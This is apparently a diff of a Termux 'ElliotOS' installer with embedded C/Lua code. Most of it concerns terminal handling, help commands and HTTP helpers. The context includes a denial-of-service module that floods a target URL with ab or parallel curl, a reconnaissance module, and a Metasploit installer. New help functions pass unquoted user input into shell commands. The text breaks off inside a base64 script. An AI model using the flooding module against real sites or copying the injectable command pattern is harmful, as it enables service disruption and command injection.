@@ -119,6 +119,7 @@ _run_uninstall() {
 # -ua / --uninstall-all → idem
 # ============================================================================
 _SKIP_PREFLIGHT=0
+_SKIP_PASS=0
 for _early_arg in "$@"; do
     case "$_early_arg" in
         -h|--help|-u|--uninstall|-ua|--uninstall-all|--doctor|--gui)
@@ -368,6 +369,7 @@ for _arg in "$@"; do
         -sq)          INSTALL_SQ=1            ;;
         -u|--uninstall) INSTALL_UNINSTALL=1  ;;
         -ua)          INSTALL_UNINSTALL=1; INSTALL_UNINSTALL_ALL=1 ;;
+        -s|--skip-password) _SKIP_PASS=1 ;;
         --update)     INSTALL_UPDATE=1       ;;
         --doctor)     ;;  # tratado no case final
         --termux)
@@ -28315,6 +28317,48 @@ int luaopen_net(lua_State *L);
 static void elliot_log(const char *type, const char *url, const char *detail);
 static void ai_config_save(void);
 
+/* ── elliot_system(): system() seguro para uso dentro do REPL readline ─────
+ * Chama rl_deprep_terminal() antes e rl_prep_terminal(1) depois para que
+ * comandos com pager (less, man, ms --doc) ou shells interativos (bash)
+ * não deixem o terminal num estado inconsistente ao sair, o que causaria
+ * abort() no readline.  Use sempre que o comando puder usar o terminal.
+ * Para verificações silenciosas (command -v ... 2>/dev/null) use system(). */
+extern void rl_deprep_terminal(void);
+extern void rl_prep_terminal(int);
+extern FILE *rl_instream;
+extern FILE *rl_outstream;
+
+/* Marcador: 0 até elliot_readline_init() ser chamado.
+ * Enquanto 0, elliot_system() evita rl_deprep/rl_prep — o readline ainda
+ * não inicializou o terminal e chamar essas funções corromperia o echo. */
+static int elliot_rl_ready = 0;
+/* elliot_rl_interactive: definido em lua.c (via patch) como variável global.
+ * 1 = processo vai de fato entrar no REPL interativo.
+ * Necessário para distinguir "ms -tv" (stdin é TTY mas não há REPL)
+ * de "ms" interativo. elliot_system() só usa rl_deprep/prep quando
+ * AMBOS elliot_rl_ready e elliot_rl_interactive são 1.
+ * Setado para 1 dentro do pushline() do lua.c patchado, que é o
+ * primeiro momento em que o REPL realmente começa a ler input. */
+extern int elliot_rl_interactive;
+
+static int elliot_system(const char *cmd) {
+    /* FORTIFY fix: garante streams válidos caso readline ainda não tenha
+     * sido inicializado (boot com -tv/-Tv chama elliot_system antes do
+     * primeiro readline() — rl_instream/rl_outstream seriam NULL). */
+    if (!rl_instream)  rl_instream  = stdin;
+    if (!rl_outstream) rl_outstream = stdout;
+
+    /* Só manipula o estado do terminal se o readline foi inicializado E
+     * o processo vai de fato usar o REPL interativo.
+     * Com "ms -tv" / "ms -e ...", stdin ainda é TTY e elliot_rl_ready=1,
+     * mas elliot_rl_interactive=0 — rl_prep_terminal(1) NÃO deve ser
+     * chamado pois deixaria o terminal em modo raw ao processo terminar. */
+    if (elliot_rl_ready && elliot_rl_interactive) rl_deprep_terminal();
+    int r = system(cmd);
+    if (elliot_rl_ready && elliot_rl_interactive) rl_prep_terminal(1);
+    return r;
+}
+
 // ============================================================================
 // SYSTEM PROMPT DA CYN — portado do elliotai.py
 // ============================================================================
@@ -32597,7 +32641,7 @@ static int l_ui_fig(lua_State *L) {
     snprintf(cmd, sizeof(cmd),
         "figlet -f '%s' '%s' 2>/dev/null || figlet '%s'",
         safe_font, safe_text, safe_text);
-    system(cmd);
+    elliot_system(cmd);
     return 0;
 }
 
@@ -32802,7 +32846,7 @@ static int l_fs_help(lua_State *L) {
 }
 
 // SH
-static int l_sh_exec(lua_State *L) { lua_pushinteger(L,system(luaL_checkstring(L,1))); return 1; }
+static int l_sh_exec(lua_State *L) { lua_pushinteger(L,elliot_system(luaL_checkstring(L,1))); return 1; }
 static int l_sh_read(lua_State *L) {
     FILE *f=popen(luaL_checkstring(L,1),"r"); if(!f){lua_pushnil(L);return 1;}
     luaL_Buffer b; luaL_buffinit(L,&b);
@@ -63827,14 +63871,14 @@ static int l_ic(lua_State *L) {
 
     /* 2. Decodifica com base64 -d (lê de arquivo, não de pipe) */
     snprintf(cmd, sizeof(cmd), "base64 -d '%s' > '%s' 2>/dev/null", tmp_b64, tmp_png);
-    system(cmd);
+    elliot_system(cmd);
     remove(tmp_b64);
 
     /* 3. Exibe e limpa */
     snprintf(cmd, sizeof(cmd),
         "command -v timg >/dev/null 2>&1 && timg --center -g 60x20 '%s' 2>/dev/null",
         tmp_png);
-    system(cmd);
+    elliot_system(cmd);
     remove(tmp_png);
     return 0;
 }
@@ -72078,19 +72122,19 @@ static int l_mod_recon(lua_State *L) {
     // DNS + IP
     printf("\033[1;36m── DNS / IP ──────────────────────────────────\033[0m\n");
     snprintf(cmd,sizeof(cmd),"host '%s' 2>/dev/null | head -6", target);
-    system(cmd);
+    elliot_system(cmd);
     snprintf(cmd,sizeof(cmd),"dig +short '%s' A 2>/dev/null | head -5", target);
     FILE *f=popen(cmd,"r"); if(f){char b[512];while(fgets(b,sizeof(b),f))printf("  IP: %s",b);pclose(f);}
 
     // WHOIS resumido
     printf("\n\033[1;36m── WHOIS ──────────────────────────────────────\033[0m\n");
     snprintf(cmd,sizeof(cmd),"whois '%s' 2>/dev/null | grep -iE 'Registrar:|Creation|Expiry|Name Server:|Registrant' | head -8", target);
-    system(cmd);
+    elliot_system(cmd);
 
     // Headers HTTP
     printf("\n\033[1;36m── Headers HTTP ───────────────────────────────\033[0m\n");
     snprintf(cmd,sizeof(cmd),"curl -sgkI --max-time 2 'http://%s' 2>/dev/null | head -20", target);
-    system(cmd);
+    elliot_system(cmd);
 
     // Tecnologias (via headers e meta)
     printf("\n\033[1;36m── Tecnologias Detectadas ─────────────────────\033[0m\n");
@@ -72351,7 +72395,7 @@ static int l_mod_dos(lua_State *L) {
         char cmd[1024];
         snprintf(cmd,sizeof(cmd),"ab -n %d -c %d -s 5 '%s' 2>&1 | grep -E 'Requests per|Failed|Time taken|Transfer rate|Complete'",
             requests, concurrency, target);
-        system(cmd);
+        elliot_system(cmd);
     } else {
         printf("\033[1;33m[*] ab não encontrado, usando curl em paralelo...\033[0m\n\n");
         int ok=0, fail=0;
@@ -72432,7 +72476,7 @@ static int l_mod_info(lua_State *L) {
     // Headers completos
     printf("\033[1;36m── Headers de Resposta ────────────────────────\033[0m\n");
     snprintf(cmd,sizeof(cmd),"curl -sgkI --max-time 3 -A 'Mozilla/5.0' '%s' 2>/dev/null", url);
-    system(cmd);
+    elliot_system(cmd);
 
     // Cookies
     printf("\n\033[1;36m── Cookies ────────────────────────────────────\033[0m\n");
@@ -78066,6 +78110,10 @@ void elliot_readline_init(void) {
     rl_bind_key('{',  elliot_ap_brace);
     rl_bind_key('"',  elliot_ap_dquote);
     rl_bind_key('\'', elliot_ap_squote);
+
+    /* Sinaliza que o readline está completamente inicializado.
+     * A partir daqui, elliot_system() pode usar rl_deprep/rl_prep com segurança. */
+    elliot_rl_ready = 1;
 }
 
 /* ── Implementação dos auto-pair handlers ───────────────────────────────── */
@@ -90162,8 +90210,196 @@ static void elliot_load_prelude(lua_State *L) {
 "    return v\n"
 "  end\n"
 "\n"
+"  function json.help()\n"
+"    print('\\027[1;35m╔══════════════════════════════════════════════════════════════╗\\027[0m')\n"
+"    print('\\027[1;35m║  json — encode/decode JSON                                   ║\\027[0m')\n"
+"    print('\\027[1;35m╚══════════════════════════════════════════════════════════════╝\\027[0m')\n"
+"    print()\n"
+"    print('\\027[1;33m  json.encode\\027[0m(value)   -> string JSON')\n"
+"    print('\\027[0;90m    nil->\"null\"  true/false->\"true\"/\"false\"  number->num\\027[0m')\n"
+"    print('\\027[0;90m    string->str  table(array)->[...]  table(dict)->{...}\\027[0m')\n"
+"    print()\n"
+"    print('\\027[1;33m  json.decode\\027[0m(str)     -> value Lua')\n"
+"    print('\\027[0;90m    \"null\"->nil  \"true\"/\"false\"->boolean  numero->number\\027[0m')\n"
+"    print('\\027[0;90m    \"[...]\"->{} array  \"{...}\"->{} dict aninhado\\027[0m')\n"
+"    print()\n"
+"    print('\\027[1;36m  Exemplos:\\027[0m')\n"
+"    print('\\027[0;90m    json.encode({x=1, y={2,3}})  --> \\'{\\'\"x\\':1,...}\\'\\027[0m')\n"
+"    print('\\027[0;90m    json.decode(\\'{\"a\":1}\\').a    --> 1\\027[0m')\n"
+"    print('\\027[0;90m    local b,c = net.get(url)\\027[0m')\n"
+"    print('\\027[0;90m    local r = json.decode(b)     -- parseia resposta API\\027[0m')\n"
+"    print('\\027[0;90m    ms --doc json                -- doc completa\\027[0m')\n"
+"  end\n"
+"\n"
 "  -- Atalhos no global: json.encode / json.decode\n"
 "  _G.json = json\n"
+"end\n"
+
+/* ======================================================================
+   ELLIOTOS — net.* EXTENSÕES (Lua puro, sem tocar no C)
+   net.request  — interface unificada tipo requests do Python
+   net.session  — mantém cookies/headers entre requisições
+   net.get_json — atalho GET + json.decode
+   net._parse_headers — parseia o blob de headers cru de net.fetch e
+                         reconstrói a URL final após redirects
+   ====================================================================== */
+"do\n"
+"  -- Parseia o texto bruto de headers (retorno de net.fetch) em uma tabela\n"
+"  -- chave->valor (chaves em minusculas, ultima resposta) e reconstroi a\n"
+"  -- URL final apos seguir os redirects (Location:) registrados no blob.\n"
+"  function net._parse_headers(raw, base_url)\n"
+"    raw = raw or ''\n"
+"    local blocks = {}\n"
+"    for blk in (raw .. '\\r\\n\\r\\n'):gmatch('(.-)\\r\\n\\r\\n') do\n"
+"      if blk ~= '' then blocks[#blocks+1] = blk end\n"
+"    end\n"
+"    local final_url = base_url\n"
+"    for _, blk in ipairs(blocks) do\n"
+"      local loc = blk:match('[Ll]ocation:%s*(%S+)')\n"
+"      if loc then\n"
+"        if loc:match('^https?://') then\n"
+"          final_url = loc\n"
+"        elseif loc:sub(1,1) == '/' then\n"
+"          local origin = final_url:match('^(https?://[^/]+)') or final_url\n"
+"          final_url = origin .. loc\n"
+"        else\n"
+"          local base = final_url:match('^(.*/)') or (final_url .. '/')\n"
+"          final_url = base .. loc\n"
+"        end\n"
+"      end\n"
+"    end\n"
+"    local headers = {}\n"
+"    local last = blocks[#blocks] or ''\n"
+"    for line in last:gmatch('[^\\r\\n]+') do\n"
+"      local k, v = line:match('^([%w%-]+):%s*(.*)$')\n"
+"      if k then headers[k:lower()] = v end\n"
+"    end\n"
+"    return headers, final_url\n"
+"  end\n"
+"\n"
+"  -- net.request(method, url, opts) — interface unificada tipo requests do Python\n"
+"  -- opts: { headers={}, params={}, json=<valor lua>, body=str, timeout, follow,\n"
+"  --         quiet, ua, file, connect, proxy, ... }  (o resto passa direto pro net.fetch)\n"
+"  -- Retorna em sucesso: tabela { body, code, headers, raw_headers, url, ok, json=fn(self) }\n"
+"  -- Retorna em erro de rede: nil, mensagem_de_erro (igual net.fetch)\n"
+"  function net.request(method, url, opts)\n"
+"    opts = opts or {}\n"
+"    method = (method or 'GET'):upper()\n"
+"\n"
+"    -- monta query string a partir de opts.params\n"
+"    if opts.params then\n"
+"      local parts = {}\n"
+"      for k, v in pairs(opts.params) do\n"
+"        parts[#parts+1] = tostring(k) .. '=' .. tostring(v)\n"
+"      end\n"
+"      if #parts > 0 then\n"
+"        local sep = url:find('?', 1, true) and '&' or '?'\n"
+"        url = url .. sep .. table.concat(parts, '&')\n"
+"      end\n"
+"    end\n"
+"\n"
+"    local headers = {}\n"
+"    if opts.headers then for k, v in pairs(opts.headers) do headers[k] = v end end\n"
+"\n"
+"    -- serializa opts.json automaticamente como corpo JSON\n"
+"    local body = opts.body\n"
+"    if opts.json ~= nil then\n"
+"      body = json.encode(opts.json)\n"
+"      headers['Content-Type'] = headers['Content-Type'] or 'application/json'\n"
+"    end\n"
+"\n"
+"    local fetch_opts = { method = method, body = body, headers = headers }\n"
+"    for k, v in pairs(opts) do\n"
+"      if fetch_opts[k] == nil and k ~= 'params' and k ~= 'json' and k ~= 'headers' then\n"
+"        fetch_opts[k] = v\n"
+"      end\n"
+"    end\n"
+"\n"
+"    local resp_body, code, raw_headers = net.fetch(url, fetch_opts)\n"
+"    if resp_body == nil then\n"
+"      return nil, code\n"
+"    end\n"
+"\n"
+"    local parsed_headers, final_url = net._parse_headers(raw_headers, url)\n"
+"\n"
+"    return {\n"
+"      body        = resp_body,\n"
+"      code        = code,\n"
+"      headers     = parsed_headers,\n"
+"      raw_headers = raw_headers,\n"
+"      url         = final_url,\n"
+"      ok          = (code >= 200 and code < 300),\n"
+"      json        = function(self) return json.decode(self.body) end,\n"
+"    }\n"
+"  end\n"
+"\n"
+"  -- net.get_json(url [, opts]) — GET + json.decode em uma linha\n"
+"  -- Retorna: tabela_decodificada, http_code   ou   nil, mensagem_de_erro\n"
+"  function net.get_json(url, opts)\n"
+"    local resp, err = net.request('GET', url, opts)\n"
+"    if not resp then return nil, err end\n"
+"    local ok, data = pcall(json.decode, resp.body)\n"
+"    if not ok then return nil, 'json.decode falhou: ' .. tostring(data) end\n"
+"    return data, resp.code\n"
+"  end\n"
+"\n"
+"  -- net.session() — objeto que mantem cookies e headers globais entre requisicoes\n"
+"  local Session = {}\n"
+"  Session.__index = Session\n"
+"\n"
+"  function net.session()\n"
+"    return setmetatable({ cookies = {}, headers = {} }, Session)\n"
+"  end\n"
+"\n"
+"  function Session:set_header(k, v)\n"
+"    self.headers[k] = v\n"
+"  end\n"
+"\n"
+"  function Session:_cookie_header()\n"
+"    local parts = {}\n"
+"    for k, v in pairs(self.cookies) do parts[#parts+1] = k .. '=' .. v end\n"
+"    return table.concat(parts, '; ')\n"
+"  end\n"
+"\n"
+"  function Session:_update_cookies(raw_headers)\n"
+"    for line in (raw_headers or ''):gmatch('[^\\r\\n]+') do\n"
+"      local cookie = line:match('^[Ss]et%-[Cc]ookie:%s*(.-)$')\n"
+"      if cookie then\n"
+"        local name, val = cookie:match('^([^=%s]+)=([^;]*)')\n"
+"        if name then self.cookies[name] = val end\n"
+"      end\n"
+"    end\n"
+"  end\n"
+"\n"
+"  function Session:request(method, url, opts)\n"
+"    opts = opts or {}\n"
+"    local merged = {}\n"
+"    for k, v in pairs(opts) do merged[k] = v end\n"
+"    local headers = {}\n"
+"    for k, v in pairs(self.headers) do headers[k] = v end\n"
+"    if opts.headers then for k, v in pairs(opts.headers) do headers[k] = v end end\n"
+"    local ck = self:_cookie_header()\n"
+"    if ck ~= '' then headers['Cookie'] = ck end\n"
+"    merged.headers = headers\n"
+"\n"
+"    local resp, err = net.request(method, url, merged)\n"
+"    if resp then self:_update_cookies(resp.raw_headers) end\n"
+"    return resp, err\n"
+"  end\n"
+"\n"
+"  function Session:get(url, opts)    return self:request('GET', url, opts) end\n"
+"  function Session:post(url, opts)   return self:request('POST', url, opts) end\n"
+"  function Session:put(url, opts)    return self:request('PUT', url, opts) end\n"
+"  function Session:delete(url, opts) return self:request('DELETE', url, opts) end\n"
+"\n"
+"  function net.session_help()\n"
+"    print('\\027[1;35mnet.session()\\027[0m — sessao HTTP com cookies persistentes')\n"
+"    print('\\027[0;90m  local s = net.session()\\027[0m')\n"
+"    print('\\027[0;90m  s:set_header(\\'Authorization\\', \\'Bearer xyz\\')\\027[0m')\n"
+"    print('\\027[0;90m  local r = s:get(\\'https://exemplo.com/login\\')\\027[0m')\n"
+"    print('\\027[0;90m  local r2 = s:post(\\'https://exemplo.com/api\\', {json={a=1}})\\027[0m')\n"
+"    print('\\027[0;90m  print(r2.code, r2.ok, r2:json())\\027[0m')\n"
+"  end\n"
 "end\n"
 
 /* -- Injeção de metodos em string via __index -------------------------- */
@@ -90858,7 +91094,7 @@ static int l_back_impl(lua_State *LL) {
     (void)LL;
     printf("  \033[1;33m-> bash\033[0m  (exit para voltar ao ElliotOS)\n");
     fflush(stdout);
-    system("bash");
+    elliot_system("bash");
     printf("  \033[1;32m<- ElliotOS\033[0m\n");
     return 0;
 }
@@ -91132,7 +91368,7 @@ static void adb_session_restore(void) {
     if (system("command -v adb >/dev/null 2>&1") != 0) return;
     char cmd[256];
     snprintf(cmd, sizeof(cmd), "adb connect %s >/dev/null 2>&1", saved);
-    int rc = system(cmd);
+    int rc = elliot_system(cmd);
     if (rc == 0) {
         snprintf(g_adb_device, sizeof(g_adb_device), "%s", saved);
         printf("\033[0;90m[adb] sessao restaurada \xe2\x86\x92 %s\033[0m\n", g_adb_device);
@@ -92197,6 +92433,9 @@ static int ivar_inside_string(const char *src, int pos) {
     return in_sq || in_dq;
 }
 
+/* forward declaration — definida mais abaixo, usada em ivar_preprocess_line */
+static int elliot_handle_help(const char *line, char *out_blank);
+
 /*
  * Pré-processa uma linha de código Lua:
  *  1. Detecta declarações  (local )? nome = ...  e registra variáveis.
@@ -92206,6 +92445,8 @@ static int ivar_inside_string(const char *src, int pos) {
  */
 static char *ivar_preprocess_line(const char *line) {
     static char out[4096];
+    /* --- Passo 0: intercepta :help / help <tópico> --- */
+    if (elliot_handle_help(line, out)) return out;  /* out já contém "" */
     /* --- Passo 1: detecta declaração de variável --- */
     const char *p = line;
     /* pula espaços */
@@ -92283,6 +92524,15 @@ static char *ivar_preprocess_line(const char *line) {
  * Retorna string alocada com malloc — chamador deve liberar com free().
  */
 char *elliot_ivar_preprocess_block(const char *code) {
+    /* ── :help / help — sempre interceptado, ivar ativo ou não ── */
+    {
+        char _hout[1];
+        if (elliot_handle_help(code, _hout)) {
+            char *empty = (char *)malloc(1);
+            if (empty) empty[0] = '\0';
+            return empty;
+        }
+    }
     if (!g_ivar_enabled) {
         /* não ativado: devolve cópia sem modificação */
         char *copy = (char *)malloc(strlen(code) + 1);
@@ -92408,6 +92658,61 @@ static int l_ivar_help(lua_State *L) {
     return 0;
 }
 
+/* ══════════════════════════════════════════════════════════════════════════
+ * ElliotOS — :help / help  no REPL interativo
+ * Detecta linhas ":help <tópico>" ou "help <tópico>" antes do parsing Lua
+ * e exibe a documentação via ms --doc, sem sair do REPL.
+ *
+ * Chamada por elliot_ivar_preprocess_block() antes de qualquer parsing.
+ * Retorna 1 se a linha foi tratada como comando de help (linha substituída
+ * por linha em branco) ou 0 se não era um comando de help.
+ * ══════════════════════════════════════════════════════════════════════════ */
+static int elliot_handle_help(const char *line, char *out_blank) {
+    /* pula espaços iniciais */
+    const char *p = line;
+    while (*p == ' ' || *p == '\t') p++;
+
+    /* aceita ":help" ou "help" (com ou sem dois-pontos) */
+    int colon = 0;
+    if (*p == ':') { colon = 1; p++; }
+    if (strncmp(p, "help", 4) != 0) return 0;
+    p += 4;
+    /* após "help" deve vir espaço, '\0', '\n', ou nada mais */
+    if (*p != '\0' && *p != '\n' && *p != ' ' && *p != '\t') {
+        /* era algo como "helper" — não é nosso comando */
+        if (!colon) return 0;
+    }
+    /* pula espaços/tabs entre "help" e o argumento */
+    while (*p == ' ' || *p == '\t') p++;
+
+    /* monta comando ms --doc [tópico] */
+    char cmd[256];
+    if (*p == '\0' || *p == '\n') {
+        /* ":help" / "help" sem argumento → doc geral */
+        snprintf(cmd, sizeof(cmd), "ms --doc 2>/dev/null || lua-net --doc 2>/dev/null || true");
+    } else {
+        /* coleta tópico; para em aspas, \n ou fim de string */
+        char topic[128];
+        int ti = 0;
+        while (*p && *p != '\'' && *p != '"' && *p != '\n' && ti < 127)
+            topic[ti++] = *p++;
+        /* remove trailing spaces */
+        while (ti > 0 && topic[ti-1] == ' ') ti--;
+        topic[ti] = '\0';
+        snprintf(cmd, sizeof(cmd),
+                 "ms --doc %s 2>/dev/null || lua-net --doc %s 2>/dev/null || true",
+                 topic, topic);
+    }
+    /* Libera o terminal do readline antes de rodar o pager (less/more).
+     * Sem isso, quando o pager sai o terminal fica num estado inconsistente
+     * e o readline chama abort(). Restaura depois. */
+    elliot_system(cmd);
+
+    /* devolve linha vazia para que o REPL não tente interpretar nada */
+    if (out_blank) out_blank[0] = '\0';
+    return 1;
+}
+
 /* Inicializa e registra o módulo ivar no estado Lua */
 static void elliot_ivar_init(lua_State *L) {
     ivar_config_load(); /* restaura estado salvo pelo usuário */
@@ -92422,6 +92727,22 @@ static void elliot_ivar_init(lua_State *L) {
     lua_setglobal(L, "ivar");
 }
 /* ══ fim do módulo ivar ════════════════════════════════════════════════════ */
+
+/* ── help global: help() / help("topico") → ms --doc [topico] ── */
+static int l_elliot_help_global(lua_State *L) {
+    const char *topic = lua_tostring(L, 1);
+    char cmd[256];
+    if (!topic || *topic == '\0') {
+        snprintf(cmd, sizeof(cmd),
+            "ms --doc 2>/dev/null || lua-net --doc 2>/dev/null || true");
+    } else {
+        snprintf(cmd, sizeof(cmd),
+            "ms --doc %s 2>/dev/null || lua-net --doc %s 2>/dev/null || true",
+            topic, topic);
+    }
+    elliot_system(cmd);
+    return 0;
+}
 
 int luaopen_net(lua_State *L) {
 
@@ -92855,6 +93176,12 @@ int luaopen_net(lua_State *L) {
     lua_pushcfunction(L,l_adb_help);      lua_setfield(L,-2,"help");
     lua_setglobal(L,"adb");
 
+    /* ── help global: help / help("topico") → ms --doc [topico] ── */
+    {
+        lua_pushcfunction(L, l_elliot_help_global);
+        lua_setglobal(L, "help");
+    }
+
     return 0;
 }
 LIBNET_EOF
@@ -92870,6 +93197,8 @@ LIBNET_EOF
     # sem depender de require() ou linit.c
 
     # Injeta declaração extern se ainda não existir
+    # Remove versão antiga de elliot_rl_interactive (extern) se presente — agora é definição em lua.c
+    sed -i '/extern int elliot_rl_interactive/d' lua.c 2>/dev/null || true
     if ! grep -q "extern int luaopen_net" lua.c 2>/dev/null; then
         awk '
             /^#include/ { last_include = NR }
@@ -92878,10 +93207,15 @@ LIBNET_EOF
                 for (i = 1; i <= NR; i++) {
                     print lines[i]
                     if (i == last_include)
-                        print "extern int luaopen_net(lua_State *L);\nextern void elliot_readline_init(void);\nextern char *elliot_ivar_preprocess_block(const char *code);"
+                        print "extern int luaopen_net(lua_State *L);\nextern void elliot_readline_init(void);\nextern char *elliot_ivar_preprocess_block(const char *code);\nextern int elliot_handle_help(const char *line, char *out_blank);\nint elliot_rl_interactive = 0; /* ElliotOS: 1 quando REPL interativo esta ativo */"
                 }
             }
         ' lua.c > lua.c.tmp && mv lua.c.tmp lua.c
+    fi
+
+    # Garante definição de elliot_rl_interactive mesmo se o bloco extern já existia sem ela
+    if ! grep -q "elliot_rl_interactive" lua.c 2>/dev/null; then
+        sed -i 's/extern int elliot_handle_help[^;]*;/&\nint elliot_rl_interactive = 0; \/* ElliotOS: 1 quando REPL interativo esta ativo *\//' lua.c
     fi
 
     # Injeta chamada luaopen_net(L) após luaL_openlibs — aceita variações de espaço/indentação
@@ -92900,30 +93234,26 @@ LIBNET_EOF
     # Patcha lua.c: injeta ivar_preprocess_block() em pushline()
     # pushline() é a função do Lua 5.4 que empurra a linha lida pro buffer.
     # Interceptamos ali pra pré-processar !N antes de qualquer parsing.
-    if ! grep -q "elliot_ivar_preprocess_block" lua.c 2>/dev/null; then
-        awk '
-        /^#include/ { last_inc=NR }
-        { lines[NR]=$0 }
-        END {
-            for (i=1;i<=NR;i++) {
-                print lines[i]
-                if (i==last_inc) {
-                    print "/* ElliotOS: ivar preprocessor hook */"
-                    print "extern char *elliot_ivar_preprocess_block(const char *);"
-                }
-            }
-        }
-        ' lua.c > lua.c.tmp && mv lua.c.tmp lua.c
-
+    # Guard usa elliot_ivar_preprocess_block(b) — específico do hook em pushline,
+    # não confunde com o extern já adicionado pelo patch anterior.
+    # Nota: [[:space:]]* cobre o espaço antes do ( em "pushline (lua_State *L ...)"
+    if ! grep -q "elliot_ivar_preprocess_block(b)" lua.c 2>/dev/null; then
         # Dentro de pushline(): após obter a linha (lua_readline ou readline),
-        # antes de luaL_addstring/luaL_pushresult, pré-processa o buffer.
+        # pré-processa o buffer antes de qualquer parsing Lua.
         awk '
-        /^static int pushline\(/ { in_fn=1 }
+        /^static int pushline[[:space:]]*\(/ { in_fn=1 }
         in_fn && /lua_readline/ {
+            print "  /* ElliotOS: sinaliza que o REPL interativo esta ativo */"
+            print "  elliot_rl_interactive = 1;"
             print $0
-            print "  /* ElliotOS ivar: pré-processa !N */"
-            print "  { char *_p = elliot_ivar_preprocess_block(b);"
-            print "    if (_p) { strncpy(b, _p, LUA_MAXINPUT-1); b[LUA_MAXINPUT-1]=0; free(_p); } }"
+            print "  /* ElliotOS ivar: pre-processa !N e intercepta :help/help */"
+            print "  if (b) { char *_p = elliot_ivar_preprocess_block(b);"
+            print "    if (_p) {"
+            print "      size_t _n = strlen(_p);"
+            print "      size_t _cap = strlen(b);   /* buffer readline tem exatamente _cap+1 bytes */"
+            print "      if (_n > _cap) _n = _cap;  /* nunca escreve mais do que o buffer original */"
+            print "      memcpy(b, _p, _n); b[_n] = 0;"
+            print "      free(_p); } }"
             next
         }
         in_fn && /^\}/ { in_fn=0 }
@@ -95302,6 +95632,83 @@ _backend_github() {
     command -v "$name" &>/dev/null || _die "$name foi instalado mas o comando não está disponível no PATH"
 }
 
+_backend_source() {
+    local repo="$1" name="$2"
+    local dest="$HOME/.xpm/tools/${name}"
+    local BPFX="${PREFIX:-/data/data/com.termux/files/usr}"
+
+    _info "Compilando $name do source: github.com/$repo"
+
+    # Deps de compilação
+    for _dep in git clang make automake autoconf libtool pkg-config; do
+        command -v "$_dep" &>/dev/null || {
+            _info "Instalando dep: $_dep"
+            pkg install -y "$_dep" 2>/dev/null || true
+        }
+    done
+
+    # Clona
+    command -v git &>/dev/null || _die "git não encontrado"
+    rm -rf "$dest" 2>/dev/null
+    git clone --depth=1 "https://github.com/${repo}.git" "$dest" \
+        || _die "Falha ao clonar $repo"
+
+    cd "$dest" || _die "Falha ao entrar em $dest"
+
+    # Build — tenta as estratégias na ordem
+    local built=0
+
+    # 1. configure + make
+    if [ -f "./configure" ] || [ -f "./configure.ac" ]; then
+        if [ ! -f "./configure" ]; then
+            autoreconf -fi 2>/dev/null || true
+        fi
+        if [ -f "./configure" ]; then
+            _info "Rodando ./configure"
+            ./configure --prefix="$BPFX" 2>/dev/null && \
+            make -j2 2>/dev/null && \
+            make install 2>/dev/null && built=1
+        fi
+    fi
+
+    # 2. cmake
+    if [ "$built" = "0" ] && command -v cmake &>/dev/null && [ -f "CMakeLists.txt" ]; then
+        _info "Rodando cmake"
+        mkdir -p build && cd build
+        cmake .. -DCMAKE_INSTALL_PREFIX="$BPFX" 2>/dev/null && \
+        make -j2 2>/dev/null && \
+        make install 2>/dev/null && built=1
+        cd "$dest"
+    fi
+
+    # 3. Makefile direto
+    if [ "$built" = "0" ] && [ -f "Makefile" ]; then
+        _info "Rodando make direto"
+        make -j2 PREFIX="$BPFX" 2>/dev/null && \
+        make install PREFIX="$BPFX" 2>/dev/null && built=1
+    fi
+
+    cd "$HOME"
+
+    if [ "$built" = "0" ]; then
+        _die "Falha ao compilar $name — verifique as dependências manualmente"
+    fi
+
+    # Verifica se o binário chegou no PATH
+    if ! command -v "$name" &>/dev/null; then
+        # Procura o binário compilado e copia manualmente
+        local bin
+        bin=$(find "$dest" -maxdepth 3 -type f -name "$name" -perm /111 2>/dev/null | head -1)
+        if [ -n "$bin" ]; then
+            cp "$bin" "$BPFX/bin/$name"
+            chmod +x "$BPFX/bin/$name"
+            _ok "Binário copiado para $BPFX/bin/$name"
+        else
+            _warn "$name compilado mas binário não encontrado no PATH — pode estar em $dest"
+        fi
+    fi
+}
+
 _backend_msf() {
     local BPFX="${PREFIX:-/data/data/com.termux/files/usr}"
     local dest="$HOME/.xpm/tools/metasploit"
@@ -96560,7 +96967,7 @@ print('  android.jar salvo (' + jar_entry + ')')
   python3 - "$W2A_BIN" << 'PYEOF'
 import sys, os, stat
 path = sys.argv[1]
-script_b64 = 'IyEvdXNyL2Jpbi9lbnYgYmFzaAojIGFwcGZvcmdlIC0tIEVsbGlvdE9TIEhUTUwvQ1NTL0pTIC0+IEFQSwpWRVJTSU9OPScxLjMuMCcKUFJFRklYPSIke1BSRUZJWDotL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzcn0iClcyQV9IT01FPSIkSE9NRS8ueHBtL2FwcGZvcmdlIgpXMkFfSkFSPSIkVzJBX0hPTUUvYW5kcm9pZC5qYXIiClcyQV9LUz0iJEhPTUUvLnhwbS90b29scy9hcGt0b29sL3hwbS1jb21wYXQtdGVzdC5rZXlzdG9yZSIKWyAtZiAiJFcyQV9LUyIgXSB8fCBXMkFfS1M9IiRXMkFfSE9NRS9hcHBmb3JnZS5rZXlzdG9yZSIKX29rKCkgICB7IHByaW50ZiAnXDAzM1sxOzMybSAgb2sgJXNcMDMzWzBtXG4nICAiJDEiOyB9Cl9pbmZvKCkgeyBwcmludGYgJ1wwMzNbMTszNm0gIC0+ICVzXDAzM1swbVxuJyAgIiQxIjsgfQpfd2FybigpIHsgcHJpbnRmICdcMDMzWzE7MzNtICAhICAlc1wwMzNbMG1cbicgICIkMSI7IH0KX2VycigpICB7IHByaW50ZiAnXDAzM1sxOzMxbSAgWCAgJXNcMDMzWzBtXG4nICIkMSIgPiYyOyBleGl0IDE7IH0KX2hlYWQoKSB7IHByaW50ZiAnXG5cMDMzWzE7MzVtICA9PSAlcyA9PVwwMzNbMG1cbicgIiQxIjsgfQpfZGltKCkgIHsgcHJpbnRmICdcMDMzWzA7OTBtICAlc1wwMzNbMG1cbicgIiQxIjsgfQpfcGVybV9yZXNvbHZlKCkgewogIGxvY2FsIHAKICBmb3IgcCBpbiAkKHByaW50ZiAnJXMnICIkMSIgfCB0ciAnLCcgJyAnKTsgZG8KICAgIGNhc2UgIiQocHJpbnRmICclcycgIiRwIiB8IHRyICdBLVonICdhLXonIHwgdHIgLWQgJyAnKSIgaW4KICAgICAgaW50ZXJuZXR8bmV0fG5ldHdvcmspICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5JTlRFUk5FVCcgOzsKICAgICAgY2FtZXJhfHdlYmNhbXxjYW0pICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5DQU1FUkEnIDs7CiAgICAgIG1pY3xtaWNyb3Bob25lfGF1ZGlvf